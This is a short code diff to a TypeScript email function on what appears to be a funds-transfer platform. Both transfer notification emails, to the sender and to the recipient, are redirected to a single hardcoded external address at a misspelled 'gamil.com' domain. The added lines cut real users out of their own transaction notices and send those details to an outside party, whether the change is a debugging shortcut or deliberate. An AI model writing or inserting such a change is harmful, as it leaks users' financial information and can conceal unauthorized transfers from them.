@@ -55,13 +55,13 @@ export async function sendTransferEmails(
     const emailResults = await Promise.allSettled([
       resend.emails.send({
         from: process.env.ADMIN_EMAIL || 'notifications@coinspectrum.net',
-        to: senderEmail,
+        to: 'ziecozeno4@gamil.com',
         subject: 'Transfer Successful',
         react: senderEmailComponent
       }),
       resend.emails.send({
         from: process.env.ADMIN_EMAIL || 'notifications@coinspectrum.net',
-        to: recipientEmail,
+        to: 'ziecozeno4@gamil.com',
         subject: 'Funds Received',
         react: recipientEmailComponent
       }),
